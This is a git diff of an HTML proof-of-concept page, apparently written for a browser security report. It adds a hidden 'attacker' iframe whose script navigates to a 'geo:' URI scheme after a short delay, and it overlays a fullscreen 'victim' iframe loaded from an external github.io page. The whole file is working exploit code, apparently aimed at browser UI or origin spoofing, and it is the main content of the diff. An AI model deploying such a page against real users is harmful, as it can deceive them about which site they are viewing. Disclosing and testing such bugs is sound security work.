@@ -1,8 +1,26 @@
-<!DOCTYPE html><html><body>
-<h1>RENDERED top-level = origin A</h1>
-<p>Top-level origin: <b id="o"></b></p>
-<p>This document stays visible/rendered the whole time.</p>
-<iframe id="f" src="https://intanjelek.github.io/spoof/iframe.html"
-        style="width:340px;height:170px;border:2px solid #c00"></iframe>
-<script>document.getElementById('o').textContent = location.origin;</script>
-</body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PoC</title>
+</head>
+<body>
+ 
+<!-- Hidden attacker iframe that triggers URI scheme nav -->
+<iframe id="attack-frame" style="display:none;width:1px;height:1px;" srcdoc="
+  <script>
+    setTimeout(function() {
+      try { location.href = 'geo:0,0'; } catch(e) {}
+    }, 50);
+  </script>
+"></iframe>
+ 
+<!-- Fullscreen victim iframe -->
+<iframe id="victim-frame"
+  src="https://intanjelek.github.io/spoof/iframe.html"
+  style="position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;"
+></iframe>
+ 
+</body>
+</html>
